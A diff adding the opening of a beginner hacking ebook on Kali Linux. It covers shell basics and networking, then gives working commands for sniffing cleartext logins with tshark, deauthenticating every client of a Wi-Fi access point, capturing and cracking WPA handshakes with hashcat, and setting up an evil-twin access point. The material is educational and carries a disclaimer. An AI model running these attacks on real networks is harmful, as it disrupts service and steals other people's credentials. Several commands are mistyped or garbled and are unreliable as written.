@@ -1,0 +1,3529 @@
+Linux For Hackers: Getting Started with Networking, WiFi Hacking, and Python Scripting
+
+Copyright © 2025 Nicolae Juravlea
+
+All rights reserved. This book, or any part of it, may not be copied, stored in a retrieval system, or shared in any form without the publisher's prior written consent. Exceptions apply for brief quotations used in critical articles or reviews.
+
+We’ve done our best to ensure the information in this book is accurate. However, it is provided "as is," without any guarantees, explicit or implied. The authors and its distributors are not responsible for any damages resulting from the use of this book.
+
+Published by Nicolae Juravlea
+
+Disclaimer
+
+This book is written purely for educational purposes. The methods described here should only be used in environments with the explicit permission of the network owner.
+
+You shall not misuse the information to gain unauthorised access. However, you may try out these hacks on your own computer at your own risk.
+
+Performing hack attempts without permission on computers that you do not own is illegal.
+
+
+
+
+
+Table of Contents
+
+
+Chapter 1: Introduction
+
+Getting Started with Linux
+
+Networking Basics Every Hacker Needs
+
+Essential Tshark Commands to Monitor Networks
+
+Capturing Usernames & Passwords with Tshark
+
+
+
+Chapter 2: Wi-Fi Hacking
+
+Test Your Wireless Adapter
+
+Perform a Denial of Service Attack on a Wireless Network
+
+Crack WiFi Passwords using Hashcat
+
+Intro to Evil Twin and Captive Portals
+
+Set up an Access Point with Hostapd
+
+Set Up a Captive Portal Login Page
+
+Capture Login Information from the Captive Portal using a PHP Script
+
+
+
+Chapter 3: Password Hashing and Cracking
+
+Crack Password Hashes with Hashcat
+
+Crack Windows Passwords with John the Ripper
+
+Crack Linux Passwords with John the Ripper
+
+Crack Password Protected ZIP Files
+
+Bypass Windows Passwords using Kali Linux
+
+
+
+Chapter 4: Python Scripting
+
+Network Scanner with OS Detection
+
+Build an FTP Cracker
+
+Create a Keylogger using Python
+
+Create a Custom Wordlist
+
+Automate WiFi Hacking with Python
+
+Fake Captive Portal (Flask)
+
+
+
+Chapter 5: Reverse Shells
+
+How Reverse Shells Work
+
+Creating Reverse Shells with Python
+
+Creating Reverse Shells with Metasploit
+
+Detect Reverse Shells on Linux
+
+
+
+Chapter 6: Security
+
+Encrypt and Decrypt Files With GPG
+
+Hide Secret Data Inside an Image with Steghide
+
+Detect Malicious Wi-Fi Attacks with Wireshark
+
+Secure Your Wi-Fi from Brute-Force Attacks
+
+Keep an Eye on Your Logs
+
+
+
+
+
+​
+
+
+
+
+
+​ Chapter 1: Introduction
+
+
+
+
+I f you’re new to cybersecurity , hacking, or even just the idea of using a terminal, it can feel intimidating. But here’s the secret: Linux isn’t just for hackers. It’s for curious minds who want to understand how computers really work.
+
+Hackers use Linux not because it’s cool (though it is), but because it gives them control. In Windows or macOS, much of what happens is hidden behind pretty buttons and menus. But in Linux? You’re in the driver’s seat.
+
+You can see exactly how things work, and you can make the system do what you want, not the other way around. Here’s why Linux is the hacker’s choice:
+
+It’s Built for the Command Line
+
+Hackers love the command line. It’s fast, precise, and powerful, kind of like writing spells for a computer. Linux gives you a terminal that’s open, flexible, and deeply connected to the core of the system. That means you can automate tasks, dig into files, poke around the network, and launch attacks or defenses.
+
+It Comes With Hacking Tools
+
+Distros like Kali Linux or Parrot OS are made for hackers. They come loaded with hundreds of tools for scanning networks, cracking passwords, sniffing traffic, and much more. While you could install these tools on other systems, Linux is where they were meant to run.
+
+It’s Open Source
+
+Linux is like a transparent machine: you can open the hood, study the engine, and change anything you want. For hackers, this openness is gold. You can learn from the system itself, break things in a safe environment, and build your own tools, all without hitting a wall of permissions or hidden code.
+
+It’s Secure and Scriptable
+
+Linux was designed with security in mind. It gives you fine-grained control over users, permissions, and access. On top of that, it’s perfect for scripting or using Bash and Python to automate tasks, run scans, or create your own hacking tools. That’s why so many real-world hackers write their own tools instead of just clicking buttons.
+
+Quick Reminder
+
+This book’s lessons are based on an operating system called Kali Linux, a favorite among hackers and penetration testers. Kali comes packed with a wide range of built-in hacking tools, so you won’t need to download or install additional programs—it’s ready to use right out of the box.
+
+Kali Linux can be downloaded from the official website’s download page
+
+located at https://www.kali.org/downloads . Let’s get started!
+
+
+
+
+
+​ Getting Started with Linux
+
+
+
+
+I f you’re new to Linux , using the command line can feel like speaking a different language. But here’s the good news: once you learn a few basic commands, you’ll start feeling in control. Let’s start with the most useful and beginner-friendly file operations.
+
+Note: For those who are already familiar with basic commands like ls, cd, mv, and rm, feel free to jump straight to the advanced hacking chapters for more exciting content.
+
+Change Directory – cd
+
+What it does: Moves you into another folder.
+
+Think of it like: Double-clicking a folder in File Explorer.
+
+Example:
+
+cd Documents
+
+
+
+
+
+This takes you into the Documents folder inside your current location. To go back up a folder:
+
+cd ..
+
+
+
+To go all the way back to your home directory:
+
+cd
+
+
+
+List Contents – ls
+
+What it does: Shows what’s inside the current folder.
+
+Think of it like: Opening a folder and seeing all the files.
+
+Example:
+
+ls
+
+
+
+
+
+To see more details, like file sizes and permissions:
+
+ls -l
+
+
+
+If you want to find hidden files, use:
+
+ls -a
+
+
+
+Copy Files and Folders – cp
+
+What it does: Makes a copy of a file or folder.
+
+Think of it like: Copy + Paste.
+
+Example:
+
+cp myscript.py backup.py
+
+
+
+
+
+This copies myscript.py and names the new one backup.py. To copy an entire folder and its contents:
+
+cp -r folder1/ folder2/
+
+
+
+The -r means recursive — copy everything inside.
+
+Move or Rename – mv
+
+What it does: Moves or renames files and folders.
+
+Think of it like: Drag-and-drop or Rename.
+
+Example:
+
+mv notes.txt Documents/
+
+
+
+
+
+This moves notes.txt into the Documents folder.
+
+To rename a file:
+
+mv oldname.txt newname.txt
+
+
+
+Remove (Delete) – rm
+
+What it does: Deletes a file or folder.
+
+Be careful! There’s no recycle bin — it’s permanent.
+
+Example:
+
+rm test.txt
+
+
+
+
+
+Deletes test.txt. To delete a folder and everything inside it:
+
+rm -r old_folder/
+
+
+
+Mini Practice Session
+
+Open your terminal and try the commands:
+
+cd # Go to your home folder
+
+mkdir mypractice # Make a new folder
+
+cd mypractice
+
+touch hello.txt # Create a new file
+
+ls # List to see if it's there
+
+cp hello.txt copy.txt # Copy the file
+
+mv copy.txt newname.txt # Rename the copied file
+
+rm hello.txt # Delete the original
+
+cd ..
+
+rm -r mypractice # Delete the whole folder
+
+
+
+If you can do those commands, you already know 80% of what most people use every day in the terminal.
+
+Pro tip: You can always type man <command> (like man ls) to learn more about any command directly in your terminal.
+
+Wildcards
+
+Sometimes you don’t want to type every single filename, especially when there are dozens. Wildcards let you match patterns instead of names. The * wildcard = “everything”. Here is an example:
+
+ls *.txt
+
+
+
+This command lists all files ending in .txt, like notes.txt, report.txt.
+
+To delete all files that start with “myfile”, use:
+
+rm myfile*
+
+
+
+This deletes files that start with myfile, like myfile1, myfile_backup, etc.
+
+Pipes
+
+Pipes let you take the output of one command and send it to another. This is HUGE in Linux.
+
+Example:
+
+cat access.log | grep "404"
+
+
+
+This command shows only the “404” errors from the access.log file.”
+
+Another example:
+
+ps aux | grep python | head -5
+
+
+
+This will show running processes with "python", and limit to the first 5 results.
+
+Save Output to a File
+
+ls > files.txt
+
+
+
+This saves the result of “ls” command into a file called files.txt.
+
+Linux Permissions
+
+In Linux, there are three types of permissions:
+
+Symbol Permission What it means
+
+r Read Can look inside the file
+
+w Write Can change or delete the file
+
+x Execute Can run the program or script
+
+
+
+Example:
+
+Let's say you have a file called notes.txt and you type:
+
+ls -l notes.txt
+
+
+
+The output will be:
+
+-rw-r—r—1 alex alex 1234 May 21 10:00 notes.txt
+
+
+
+Let’s break it down:
+
+● -rw-r—r—= permissions.
+
+● The first rw- → the owner (Alex) can read + write.
+
+● The second r—→ the group can only read.
+
+● The third r—→ others (everyone else) can only read.
+
+
+
+So, Alex can open and edit it, and everyone else can only open it, not change it.
+
+Changing Permissions
+
+If you want to add execute permission to a script, use:
+
+chmod +x myscript.sh
+
+
+
+Now you can run it like this:
+
+./myscript.sh
+
+
+
+The script has execute permission, and it should run with no problems.
+
+Remove Execute Permission
+
+Let’s say you don’t want anyone to run this script; you just want it to be viewable or editable. To do that, use:
+
+chmod -x myscript.sh
+
+
+
+Now, execute permission has been removed from the script.
+
+Remove Everything
+
+If you want to make a file completely inaccessible to everyone except root, use:
+
+chmod 000 myscript.sh
+
+
+
+This command removes all permissions — no read, no write, no execute. Try to open it now, and Linux will say: "Permission denied."
+
+
+
+
+
+​ Networking Basics Every Hacker Needs
+
+
+
+
+B efore you dive into hacking tools or try to break into anything (ethically, of course), there's one thing you absolutely need to understand first: networking.
+
+Think of the internet as a massive web of computers talking to each other. Hacking is often about intercepting, understanding, or manipulating that conversation, and to do that, you have to speak the language.
+
+Whether you're scanning for open ports, sniffing packets, or crafting your own scripts to exploit a vulnerable service, networking knowledge is your foundation. Let’s get started!
+
+IP Address
+
+An IP address (Internet Protocol address) is like the home address of your device on a network.
+
+It tells other computers where to find your device, just like a house number tells the mailman where to deliver a package.
+
+Example:
+
+192.168.1.100
+
+
+
+This might be your computer’s local IP on your home Wi-Fi.
+
+Websites like google.com also have IPs (like 142.250.64.78), but we don’t memorize those, that’s where DNS comes in (more on that below).
+
+Your public IP is what the rest of the internet sees. You can find it by Googling “What’s my IP”.
+
+MAC Address
+
+A MAC address (Media Access Control address) is like a fingerprint or serial number for your device’s network card (the part that connects to Wi-Fi or Ethernet).
+
+It never changes, and it’s used inside your local network to identify each device uniquely.
+
+Looks like this:
+
+00: 1A:2B:3C:4D:5E
+
+
+
+Your router uses MAC addresses to know which device is which, even if two laptops have the same IP address at different times.
+
+DNS: The Internet’s Phone Book
+
+DNS stands for Domain Name System. It translates easy-to-remember names like:
+
+google.com
+
+
+
+Into the actual IP address, like:
+
+142.250.64.78
+
+
+
+So when you type www.google.com, DNS finds the correct IP for that website, just like a phonebook matches names to phone numbers.
+
+You can test this with:
+
+nslookup google.com
+
+
+
+You’ll see its real IP address.
+
+Port: The Apartment Number
+
+If your IP address is like your building’s address, a port is like the apartment number inside.
+
+It tells your computer which service or app a connection is for.
+
+● Port 80 = websites (HTTP)
+
+● Port 443 = secure websites (HTTPS)
+
+● Port 22 = remote login (SSH)
+
+● Port 25 = email (SMTP)
+
+
+
+So when you connect to google.com over HTTPS, your browser is actually talking to:
+
+google.com:443
+
+
+
+Putting It All Together
+
+Let’s say your computer (192.168.1.10, MAC 00:1A:2B:3C:4D:5E) wants to visit youtube.com.
+
+Here’s what happens:
+
+DNS translates to youtube.com → 142.250.190.78
+
+
+
+Your computer sends a request to that IP on port 443 (because it’s a secure site).
+
+
+
+Your router uses your MAC address to make sure the reply goes to the right device.
+
+
+
+How to See Who’s Online
+
+Before you can interact with or explore any device on a network, you need to know it exists. That’s where pinging and scanning come in. These are the digital versions of knocking on doors.
+
+Let’s break them down in a way that makes total sense, even if you're brand new.
+
+Ping
+
+Ping is the internet’s version of asking, “Hey, are you online?”
+
+It sends a small packet of data (called an ICMP echo request) to a device, and if it replies, you know it’s up and reachable.
+
+Example:
+
+ping google.com
+
+
+
+Or ping your router:
+
+ping 192.168.1.1
+
+
+
+You’ll get something like:
+
+64 bytes from 142.250.64.78: icmp_seq=1 ttl=117 time=22.1 ms (google)
+
+64 bytes from 192.168.1.1: icmp_seq=1 ttl=117 time=22.1 ms (router)
+
+
+
+This means the device is online and reachable.
+
+Scan The Network
+
+One of the most famous tools for scanning is nmap. Use the following command for a basic scan:
+
+nmap 192.168.100.1
+
+
+
+
+
+This scans a local IP to see what’s running.
+
+To scan the whole network, use:
+
+nmap 192.168.100.0/24
+
+
+
+This checks every device on that subnet (e.g., your entire home or office network).You can discover live devices on a network and see which ports are open.
+
+Comprehensive Nmap Scan
+
+If you want to discover every service and operating system (OS) behind an IP with nmap, use:
+
+nmap -p- -A -T3 192.168.100.27
+
+
+
+This nmap command scans every single port on the target machine and tries to figure out what operating system, services, and software versions it’s running.
+
+The -T3 option tells Nmap to go at a normal, reliable speed, and -A enables a deeper scan that gives you detailed information.
+
+Network Interfaces on Linux
+
+A network interface is like a door or window that your Linux system uses to connect to a network. It could be:
+
+● Wired (Ethernet cable) — eth0 or enp0s3.
+
+● Wireless (Wi-Fi) — wlan0 or wlp3s0.
+
+● Virtual (used in hacking tools or VPNs) — like tun0, lo, or br0.
+
+
+
+
+
+Let’s look at the most useful commands to manage and understand your network interfaces on Linux.
+
+The Classic Tool
+
+Use ifconfig to find information about your network interfaces.
+
+ifconfig
+
+
+
+You might see:
+
+eth0: inet 192.168.1.10 netmask 255.255.255.0 broadcast 192.168.1.255
+
+wlan0: inet 192.168.1.12 ...
+
+
+
+This tells you which interfaces are up and running. To bring interfaces up or down, use:
+
+ifconfig eth0 down # disable Ethernet
+
+ifconfig eth0 up # enable it again
+
+
+
+Note: ifconfig is older and may not be installed by default on modern systems, use ip instead if that happens.
+
+Modern Replacement
+
+The ip is newer and more powerful way to work with interfaces.
+
+ip a
+
+
+
+You’ll see output like:
+
+eth0: <BROADCAST,MULTICAST,UP> ...
+
+inet 192.168.1.10/24 brd 192.168.1.255 scope global
+
+
+
+Assign IP addresses:
+
+ip addr add 192.168.1.100/24 dev eth0
+
+
+
+Bring interfaces up/down:
+
+sudo ip link set eth0 down
+
+sudo ip link set eth0 up
+
+
+
+Use ip for scripting or more advanced work, it’s more reliable across modern systems.
+
+Wireless Interfaces
+
+The iwconfig command shows and configures Wi-Fi interfaces (like wlan0).
+
+Example:
+
+iwconfig
+
+
+
+You’ll see:
+
+wlan0 IEEE 802.11 ESSID:"MyWiFi" Mode:Managed ...
+
+
+
+It tells you the mode (usually “Managed” means connected to a router).
+
+
+
+
+
+​ Essential Tshark Commands to Monitor Networks
+
+
+
+
+I f you've ever wanted to see what's really happening on your network — like what websites are being visited, or if something suspicious is happening, tshark can help you find out.
+
+Think of tshark as the command-line version of Wireshark, one of the most powerful network sniffing tools in cybersecurity. But unlike Wireshark, tshark works entirely in the terminal, which makes it perfect for:
+
+● Lightweight systems (like Raspberry Pi or remote servers).
+
+● Automation and scripting.
+
+● Fast, no-frills network analysis.
+
+
+
+So, in this section, I will walk through essential tshark commands to monitor your network. Let’s jump in.
+
+See All Network Traffic
+
+tshark -i eth0
+
+
+
+
+
+This captures all packets on interface eth0 in real time. You'll see traffic like DNS requests, HTTP pages, and more. Replace eth0 with your actual network interface (wlan0, enp0s3, etc). Use Ctrl + C to stop the capture.
+
+Capture Only HTTP Traffic
+
+tshark -i wlan0 -Y "http"
+
+
+
+Filters live traffic to show only HTTP requests and responses, perfect for watching websites being accessed in real time.
+
+Monitor Traffic From a Specific IP
+
+tshark -i eth0 host 192.168.1.12
+
+
+
+This captures all packets to and from a specific device. It’s useful for tracking the activity of one machine in your network.
+
+Save a Capture to a File
+
+tshark -i eth0 -w capture.pcap
+
+
+
+Records all captured traffic to a .pcap file for later analysis (in Wireshark or tshark). This is useful for longer sessions or offline review.
+
+Read from a Capture File
+
+tshark -r capture.pcap
+
+
+
+Loads and displays the packets from a saved capture file.
+
+Monitor DNS Queries
+
+tshark -i eth0 -Y "dns"
+
+
+
+Shows DNS lookups made by devices. It’s a great way to see which websites are being visited on your network in real time.
+
+
+
+
+
+​ Capturing Usernames & Passwords with Tshark
+
+
+
+
+M any beginner-friendly sites or older web applications still use HTTP, which transmits data without encryption.
+
+When a user logs in to an HTTP site, their username and password are sent in clear text, meaning anyone sniffing the network can read them. So, let’s see how usernames and passwords can be captured on a network.
+
+Open your Linux terminal and type the following command:
+
+tshark -i wlan0 -Y "http.request.method == POST" -T fields -e http.host -e http.request.uri -e http.file_data
+
+
+
+
+
+This command listens to your Wi-Fi network traffic (wlan0) and filters for HTTP POST requests, which are often used when someone logs into a website or submits a form.
+
+
+
+Now, I will open Firefox browser and try to login to an HTTP website ( http://testaspnet.vulnweb.com/login.aspx ). I will type “Jack” for the username and ‘letmein123’ for the password.
+
+Let’s go back to the terminal where tshark is running.
+
+
+
+As you can see, I have successfully captured the login credentials.
+
+The best way to defend against this kind of packet sniffing is to always use websites that have HTTPS, not just HTTP.
+
+When a site uses HTTPS (the "S" stands for secure), all the data you send like usernames, passwords, and messages is encrypted. That means even if someone is sniffing the network, they’ll just see scrambled data instead of readable information.
+
+
+
+
+
+​ Chapter 2: Wi-Fi Hacking
+
+
+
+
+W i-Fi networks are everywhere — in homes, offices, airports, and public spaces. And because they’re so common, they’re also a big target for hackers.
+
+So, in this section you’ll learn the most common WiFi attacks like:
+
+● Deauthentication Attacks: Force someone off a Wi-Fi network to disconnect using tools like aireplay-ng, then trick them into connecting to a fake network.
+
+
+
+● Password Cracking: Hackers capture a “handshake” when a device connects and then try to guess the password offline using tools like hashcat.
+
+
+
+● Evil Twin Attacks: The attacker creates a fake Wi-Fi network with the same name as a legit one (like "Starbucks_WiFi"). If you connect, they can intercept everything you do.
+
+
+
+● Captive Portal Hacking: This is when hackers set up a fake login page (like the ones hotels or airports use). You think it’s just asking for your email, but it could be stealing your real passwords behind the scenes.
+
+
+
+Knowing how Wi-Fi attacks work is like learning the tricks scammers use, once you see how it’s done, it’s much easier to protect yourself.
+
+
+
+
+
+​ Test Your Wireless Adapter
+
+
+
+
+T he most important feature required for wireless penetration testing is to determine whether your Wi-Fi card supports monitor mode and packet injection. Generally, the monitor mode is disabled on the built-in Wi-Fi card provided by the desktop or laptop manufacturer.
+
+To understand what a monitor mode is, you need to turn on the adapter’s operation in the “normal” (it is called “managed mode”) into monitor mode.
+
+Monitor mode enables a wireless network card to passively capture packets without associating with an access point. Think of it like listening to people’s conversations while you walk down the street.
+
+Packet injection allows you to craft and inject or send data to wireless devices and networks nearby. Packet injection is commonly used in man-in-the-middle attacks and denial-of-service attacks.
+
+Determining the Chipset
+
+The chipset is important as it will determine if the wireless adapter can support monitor mode and packet injection.
+
+The best one, which is used by most Wi-Fi pentesters is Atheros AR9271. This chipset supports packet injection monitor mode and master mode, which allows this to be used as an access point to create fake hotspots for evil twin attacks.
+
+The Alfa AWUS036NHA USB adapter has the Atheros AR9271 chipset. It’s stable, fast, and well-supported wireless network adapter.
+
+There’s also the TP-Link TL-WN722N wireless adapter, which has one of the cheapest prices but boasts surprisingly impressive performance. That being said, only v1 has the Atheros chipset since v2 uses a different chipset.
+
+Put Your Card in Monitor Mode
+
+For this step, we’ll use airmon-ng, but before that, you’ll need to locate the name of the interface. On your system, run the command ifconfig in the terminal. On your Linux system, your card should be listed as wlan0 or wlan1.
+
+ifconfig
+
+
+
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500
+
+inet 10.0.2.15 netmask 255.255.255.0 broadcast 10.0.2.255
+
+inet6 fe80::a00:27ff:fe59:1b52 prefixlen 64 scopeid 0x20<link>
+
+ether 86:09:15:d2:9e:97 txqueuelen 1000 (Ethernet)
+
+w lan0: flags=4163<UP ,BROADCAST,RUNNING,MULTICAST> mtu 1500
+
+ether EE-A5-3C-37-34-4A txqueuelen 1000 (Ethernet)
+
+RX packets 0 bytes 0 (0.0 B)
+
+RX errors 0 dropped 0 overruns 0 frame 0
+
+
+
+Once you have the name of the network interface, you can attempt to put it into monitor mode by typing airmon-ng start wlan0 (assuming your interface name is wlan0).
+
+airmon-ng start wlan0
+
+
+
+You can confirm the results by typing iwconfig, and you should see the name of your interface has changed to wlan0mon. It should also report “Mode:Monitor”
+
+iwconfig
+
+
+
+wlan0mon IEEE 802.11 Mode:Monitor Frequency:2.457 GHz Tx-Power=20 dBm
+
+Retry short long limit:2 RTS thr:off Fragment thr:off
+
+Power Management:off
+
+
+
+Test Your Card for Packet Injection
+
+After putting your card into monitor mode, you can run a test to see if the wireless network adapter is capable of injecting packets into nearby wireless networks.
+
+So, in a terminal window, type aireplay-ng — test wlan0mon to start the packet injection test.
+
+aireplay-ng—test wlan0mon
+
+
+
+12:47:05 Waiting for beacon frame (BSSID: AA:BB:CC:DD:EE) on channel 6
+
+12:47:05 Trying broadcast probe requests...
+
+12:47:06 Injection is working!
+
+12:47:07 Found 1 AP
+
+12:47:07 Trying directed probe requests...
+
+12:47:07 AA:BB:CC:DD:EE - channel: 6- 'Dobis'
+
+12:47:08 Ping (min/avg/max): 0.891ms/15.899ms/32.832ms Power: -21.72
+
+12:47:08 29/30: 97%
+
+
+
+If you get a result like above, then congratulations, your network card is successfully injecting packets into nearby networks.
+
+
+
+
+
+​ Perform a Denial of Service Attack on a Wireless Network
+
+
+
+
+A deauthentication attack is a type of denial-of-service attack that targets communication between a user and a wireless Wi-Fi access point. Deauthentication is a request that involves a router or AP telling a Wi-Fi user to disconnect from it.
+
+The process features deauthentication packets that cause the targeted client to lose connectivity from the access point.
+
+Access Point Deauthentication
+
+An attacker can send a deauthentication request to an access point (AP). The action results in the AP sending a de-authentication response to all devices connected to the wireless network.
+
+This means that a malicious actor can forward unlimited deauthentication requests, and the devices will not be able to connect to the AP, resulting in a DoS attack.
+
+Client Deauthentication
+
+The attacker sends a request to the connected device’s Access Point (AP), requesting the AP to deauthenticate the connected device.
+
+Typically, there isn’t a limit to the number of deauthentication packets that can be sent.
+
+Meanwhile, the user’s device receiving deauthentication response packets from the AP, will not be able to send packets to authenticate to the same AP simultaneously. This process makes it impossible for the device to connect to that AP.
+
+How to Perform The Attack
+
+First, you need to put the wireless adapter in monitor mode using airmon-ng.
+
+airmon-ng start wlan0
+
+
+
+This command will change your wireless interface name to wlan0mon.
+
+Scan WiFi Networks
+
+Scan all the access points in range by using airodump-ng.
+
+airodump-ng wlan0mon
+
+
+
+
+
+You will get a bunch of different access points with a lot of info you don’t understand! Let’s break them down.
+
+BSSID — the Access Point’s MAC Address
+
+PWR — the signal strength
+
+Beacons — the packets that the router sends out to alert its presence
+
+CH — the channel that information is being broadcast on
+
+AUTH — either MGT for Managed or PSK for Pre-Shared Key
+
+ESSID — the Access Point’s network name
+
+STATION — the client’s MAC Address
+
+After you find the target you wanna perform the DoS attack Press Ctrl+c to stop scanning.
+
+Deauthenticate All Users on AP
+
+To deauthenticate all the users from the AP, you need to send thousands of deauthentication frames to keep anyone from reconnecting to the AP. You can do this by typing the following command into another terminal.
+
+aireplay-ng—deauth 2000 -a 28:EF:01:35:34:85 wlan0mon
+
+
+
+This command will disconnect everyone from the access point (Orange-Net).
+
+Disconnect Wireless Clients
+
+Find the MAC address of the device you want to kick out from your network.
+
+To do that, look at the bottom of the screen on your airodump-ng scanning and select the MAC address from STATION. (The MAC Address of the target will be in the “STATION” field).
+
+So, if you know the MAC address of the router and the MAC address of the device, use the following command:
+
+aireplay-ng—deauth 2000-a [ROUTER_BSSID] -c [TARGET_MAC_ADDRESS] wlan0mon
+
+aireplay-ng—deauth 2000 -a 28:EF:01:35:34:85 -c 28:EF:01:23:46:68 wlan0mon
+
+
+
+The 2000 represents the number of deauth packets.
+
+-c is the client that you would like to kick off the network.
+
+-a is the router where the victim is connected to.
+
+wlan0mon is the name of the wireless card in monitor mode.
+
+
+
+
+
+​ Crack WiFi Passwords using Hashcat
+
+
+
+
+H ashcat is a powerful password recovery tool that can help you recover lost or forgotten passwords for a variety of platforms, including Windows, Linux, and macOS.
+
+Hashcat is also one of the few tools that can work with the GPU and offers many ways of finding passwords from hashes.
+
+The simplest way to crack a hash is to try first to guess the password. Dictionary and brute-force attacks are the most common ways of guessing passwords.
+
+These techniques make use of a file that contains words, phrases, common passwords, and other strings that are likely to be used as passwords.
+
+Enable Monitor Mode
+
+First, you need to put your wireless card in monitor mode using the following command.
+
+airmon-ng start wlan0
+
+
+
+I will assume your wireless interface name is wlan0 but be sure to use the correct name if it differs. You can use “iwconfig” command to find the wireless interface name.
+
+Find Your Target
+
+Start scanning nearby wireless routers with the following command.
+
+airodump-ng wlan0
+
+
+
+
+
+This displays a data table for all Wi-Fi routers in range.
+
+For the purposes of this demo, I will choose to crack the password of my network, “SkyNet”.
+
+Next, I need the access point MAC address (BSSID) and channel from the network. Let’s open another terminal and type:
+
+airodump-ng—bssid 28:EF:01:35:34:85 -c 6—write wpa-01 wlan0
+
+
+
+— write wpa-01 is the file name where you write the data, and where the 4-way handshake will be stored.
+
+
+
+You can use the “ls” command to see the file, which later on you need to convert to a different format in order to crack the password.
+
+Capture a WPA/WPA2 Handshake
+
+WPA/WPA2 uses a 4-way handshake to authenticate devices to the network. In order to capture the 4-way authentication handshake, you need to have the client authenticate to the AP.
+
+If they’re already authenticated, you can de-authenticate them (kick them off), and their system will automatically re-authenticate, whereby you can grab the 4-way handshake in the process. Open another terminal and type:
+
+aireplay-ng -0 100 -a 28:EF:01:35:34:85 -c 28:EF:01:23:46:68 wlan0
+
+
+
+
+
+In the screen above, notice the “WPA handshake: 28:EF:01:35:34:85” in the top right-hand corner. This means airodump-ng has successfully captured the handshake.
+
+Convert the .cap file to .hccap format
+
+Before you crack the password, you need to convert the .cap file (wpa-01.cap) to the hashcat file format .hc22000. This can be done very quickly by uploading the .cap file to https://hashcat.net/cap2hashcat and converting it to .hc22000 format.
+
+
+
+
+
+​
+
+
+C racking WPA/WPA2 handshake
+
+Hashcat is very flexible, so I’ll cover the two most common attacks:
+
+● Dictionary attack
+
+● Brute-force attack
+
+
+
+Dictionary attack
+
+In addition to hashcat, you will also need a wordlist. A word list is a list of commonly used passwords in a big text file.
+
+A popular password wordlist is rockyou.txt. It contains a list of commonly used passwords and is popular among pen testers. You can find the rockyou wordlist under /usr/share/wordlists in Kali Linux.
+
+Now, use the following command to start the cracking process:
+
+hashcat -m 22000 wpa-01.hc22000 rockyou.txt
+
+
+
+In this command, I am starting hashcat in 22000 mode, which is for attacking WPA network protocols. Next, specify the name of the file you want to crack, in my case is “wpa-01.hc22000”, and lastly “rockyou.txt” is the wordlist file.
+
+
+
+The password was successfully cracked and is “justletmein”.
+
+Brute-Force Attack
+
+The brute force attack is based on trying out every possible combination, which leads to an immense number of possible combinations as the password length increases. To start the attack, use the following command:
+
+haschcat -m 2200 -a 3 wpa-01.hc22000 ?l ?l ?l ?l ?l ?l ?l ?l ?l ?l
+
+
+
+-a 3 means you are using Brute Force Attack mode.
+
+wpa-01.hc22000 = is the converted .cap file.
+
+?l ?l ?l ?l ?l ?l ?l ?l ?l ?l = This is your mask where l = lowercase letters. This means the password is all in lowercase letters.
+
+Hashcat allows you to use the following built-in charsets to attack a WPA /WPA2 handshake file.
+
+?l = abcdefghijklmnopqrstuvwxyz
+
+?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
+
+?d = 0123456789
+
+?h = 0123456789abcdef
+
+?H = 0123456789ABCDEF
+
+?s = «space»!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
+
+
+
+So let's say your password is 87654321. You can use a custom mask like ?d?d?d?d?d?d?d?d
+
+This means you’re trying to break an 8-digit number password like 87654323 or 43446789...
+
+
+
+Here you can see the password is “justletmein” So, I’m using the lowercase letters mask (?l = abcdefghijklmnopqrstuvwxyz) to crack the password.
+
+
+
+
+
+​ Intro to Evil Twin and Captive Portals
+
+
+
+
+A n evil twin is a fake wireless access point that appears as a genuine hotspot offered by a legitimate provider.
+
+The idea is to set up a malicious wireless network with the same SSID name as the original one.
+
+Devices connecting to a Wi-Fi network like laptops, tablets, and smartphones have no way to distinguish between two Wi-Fi networks with the same SSID name.
+
+This enables hackers to set up malicious wireless networks that can capture the traffic and extract sensitive information from victims.
+
+Attack Methodology
+
+Attacker scans the air for the target access point information like SSID name, Channel number, and MAC Address.
+
+
+
+He then uses that information to create an access point with the same characteristics.
+
+
+
+Clients on the legitimate AP are repeatedly disconnected, forcing them to connect to the malicious access point.
+
+
+
+As soon as the client is connected to the fake access point, she/he may start browsing the Internet.
+
+
+
+Client opens up a browser window and sees a web login page saying “Please login to access the internet.”
+
+
+
+The client enters the password, she/he will be redirected to a loading page, and the password is stored in the database of the attacker's machine.
+
+
+
+
+
+Captive Portals
+
+A captive portal is a web page that is displayed to newly connected users of a Wi-Fi network before they are granted access to the network.
+
+Captive portals are typically used by business centers, airports, hotel lobbies, coffee shops, and other places that offer free Wi-Fi hotspots for internet users.
+
+Users can freely connect to these networks without a password and will often be directed to a login page where a password is required before being allowed to browse the web.
+
+The danger in using these types of networks is that an attacker can create a clone of the access point with the same login page and trick users to connect to the fake network.
+
+
+
+
+
+​ Set up an Access Point with Hostapd
+
+
+
+
+I n this chapter, you’ll learn how to set up a Wi-Fi Access Point using hostapd, a popular open-source software package for creating Wi-Fi networks on Linux systems.
+
+Install Hostapd & Dnsmasq
+
+For the Access Point to work, you’ll need two items:
+
+● hostapd — the Access Point software.
+
+● dnsmasq — a DHCP server that will provide IP addresses to the clients.
+
+
+
+So, start up the Linux system, and in the terminal type:
+
+apt install dnsmasq hostapd
+
+
+
+Set up the Access Point
+
+Run the “iwconfig” command to see the available wireless network interfaces (wlan0, wlan1...).
+
+
+
+Use a wireless device that supports Access Point Mode. In my case, I am using a wireless adapter with chipset Atheros AR9271 with interface name wlan0.
+
+Once you have identified your wireless interface, set up the configuration files using the nano text editor in the terminal.
+
+nano dnsmasq.conf
+
+
+
+And add the following lines.
+
+#Set the wireless interface
+
+interface=wlan0
+
+#Set the IP range for the clients
+
+dhcp-range=192.168.1.2,192.168.1.250,12h
+
+#Set the gateway IP address
+
+dhcp-option=3,192.168.1.1
+
+#Set DNS server address
+
+dhcp-option=6,192.168.1.1
+
+
+
+This configuration file will tell dnsmasq to use the wlan0 device and start handing out IP addresses to the clients in the range of 192.168.1.2 through 192.168.1.250. Don’t forget to save the file.
+
+Next, I am going to create another configuration file, this time called hostapd.conf. Open the terminal window and create the file using nano.
+
+nano hostapd.conf
+
+
+
+Add the following lines:
+
+#Set wireless interface
+
+interface=wlan0
+
+#Set network name
+
+ssid=Test-WiFi
+
+#Set channel
+
+channel=11
+
+#Set driver
+
+driver=nl80211
+
+
+
+In the example above, an Access Point is defined with the network name “Test-WiFi”, and it will run on channel 11, using wireless network interface wlan0.
+
+Save the file as hostapd.conf.
+
+At this point, you can start the access point using the following commands:
+
+dnsmasq -C /root/dnsmasq.conf
+
+hostapd /root/hostapd.conf
+
+
+
+
+
